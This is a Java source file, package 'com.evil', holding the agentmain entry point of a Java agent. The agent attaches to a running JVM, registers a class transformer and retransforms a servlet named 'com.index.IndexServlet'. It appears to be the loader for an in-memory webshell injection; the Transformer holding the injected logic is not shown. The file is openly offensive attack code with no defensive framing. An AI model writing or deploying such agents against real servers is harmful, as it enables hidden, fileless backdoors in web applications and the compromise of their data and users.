package com.evil;

import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

public class AgentMain {
    public static final String ClassName = "com.index.IndexServlet";

    public static void agentmain(String args, Instrumentation inst) {
        inst.addTransformer(new Transformer(), true);
        Class[] loadedClasses = inst.getAllLoadedClasses();
        for (Class loadedClass : loadedClasses) {
            if(loadedClass.getName().equals(ClassName)) {
                try {
                    inst.retransformClasses(loadedClass);
                } catch (UnmodifiableClassException e) {
                    e.printStackTrace();
                }
            }
        }

    }
}
